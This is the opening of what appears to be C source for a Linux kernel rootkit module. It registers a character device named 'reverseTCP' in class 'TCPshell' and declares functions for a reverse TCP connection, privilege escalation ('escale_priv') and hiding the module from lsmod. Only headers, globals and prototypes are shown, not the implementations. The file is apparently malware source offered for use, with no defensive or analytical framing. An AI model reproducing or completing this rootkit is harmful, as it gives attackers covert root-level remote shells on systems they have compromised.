#include <linux/init.h>           
#include <linux/module.h> 
#include <linux/kmod.h>        
#include <linux/device.h>         
#include <linux/kernel.h>         
#include <linux/fs.h> 
#include <linux/string.h>
#include <asm/uaccess.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include "reverseTCP_ioctl.h"

#define DEVICE_NAME "reverseTCP"    
#define CLASS_NAME  "TCPshell" 

static int    major_number = 0;//<device number -- initialized to place it on the .data section and not on .bss
static struct class*  reverseTCP_class  = NULL;//< class struct pointer
static struct device* reverseTCP_device = NULL;//< device struct pointer


static int     reverseTCP_connect(void);
static int     reverseTCP_release(struct inode *, struct file *);
static int    escale_priv(void);
static int    hide_lsmod(void);
